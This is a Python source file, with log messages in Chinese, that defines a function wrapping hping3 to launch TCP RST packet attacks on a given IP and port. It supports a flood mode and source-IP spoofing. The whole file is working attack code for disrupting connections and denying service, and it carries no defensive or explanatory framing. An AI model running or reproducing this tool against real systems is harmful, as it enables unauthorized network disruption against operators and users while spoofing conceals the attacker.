import subprocess
import time
import threading

def tcp_rst_attack(target_ip, target_port, packet_count, callback, spoof_ip=None, stop_event=None):
    callback(f"[hping3] 發動 TCP RST 攻擊至 {target_ip}:{target_port}，模式：{'Flood' if packet_count == -1 else f'{packet_count} 封包'}")
    
    cmd = ["sudo", "hping3", target_ip, "-R", "-p", str(target_port)]  # -R = RST flag

    if spoof_ip:
        cmd += ["-a", spoof_ip]
    if packet_count == -1:
        cmd += ["--flood"]
    else:
        cmd += ["-c", str(packet_count)]

    callback(f"[hping3] 執行指令：{' '.join(cmd)}")

    try:
        proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)

        def monitor_stop():
            while not (stop_event and stop_event.is_set()):
                if proc.poll() is not None:
                    break
                time.sleep(0.1)
            if stop_event and stop_event.is_set():
                callback("[hping3] 收到停止請求，正在終止攻擊...")
                try:
                    proc.terminate()
                    proc.wait(timeout=2)
                except subprocess.TimeoutExpired:
                    callback("[hping3] 攻擊未正常終止，強制終止...")
                    proc.kill()
                    proc.wait()

        stop_monitor = threading.Thread(target=monitor_stop, daemon=True)
        stop_monitor.start()

        for line in proc.stdout:
            callback(f"[hping3] {line.strip()}")
            if stop_event and stop_event.is_set():
                break

        stop_monitor.join()
        if proc.poll() is None:
            proc.terminate()
            try:
                proc.wait(timeout=2)
            except subprocess.TimeoutExpired:
                proc.kill()

        callback(f"[hping3] 攻擊結束，返回碼：{proc.returncode}")
        return proc.returncode == 0

    except Exception as e:
        callback(f"[hping3] 錯誤：{e}")
        return False
